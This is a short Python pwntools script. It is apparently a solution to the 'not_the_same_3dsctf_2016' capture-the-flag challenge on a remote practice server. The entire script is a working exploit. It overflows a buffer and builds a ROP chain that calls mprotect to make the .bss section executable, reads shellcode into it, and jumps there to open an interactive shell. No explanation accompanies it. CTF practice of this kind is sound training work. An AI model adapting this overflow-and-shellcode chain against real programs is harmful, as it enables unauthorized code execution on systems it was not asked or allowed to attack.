from pwn import *
context.log_level = 'debug'
# io = process('./not_the_same_3dsctf_2016')
io = remote('node4.buuoj.cn',27645)
elf = ELF('not_the_same_3dsctf_2016')
read_addr=elf.symbols['read']
mprotect_addr = 0x0806ED40
bss_addr = 0x80eb000
pop3_ret=0x806fcc8

shellcode = asm(shellcraft.sh())

payload = b'a'*0x2d + p32(mprotect_addr) + p32(pop3_ret) + p32(bss_addr) + p32(0x100) + p32(0x7)
payload += p32(read_addr) + p32(pop3_ret) + p32(0) + p32(bss_addr) + p32(len(shellcode)) + p32(bss_addr)

io.sendline(payload)
io.sendline(shellcode)

io.interactive()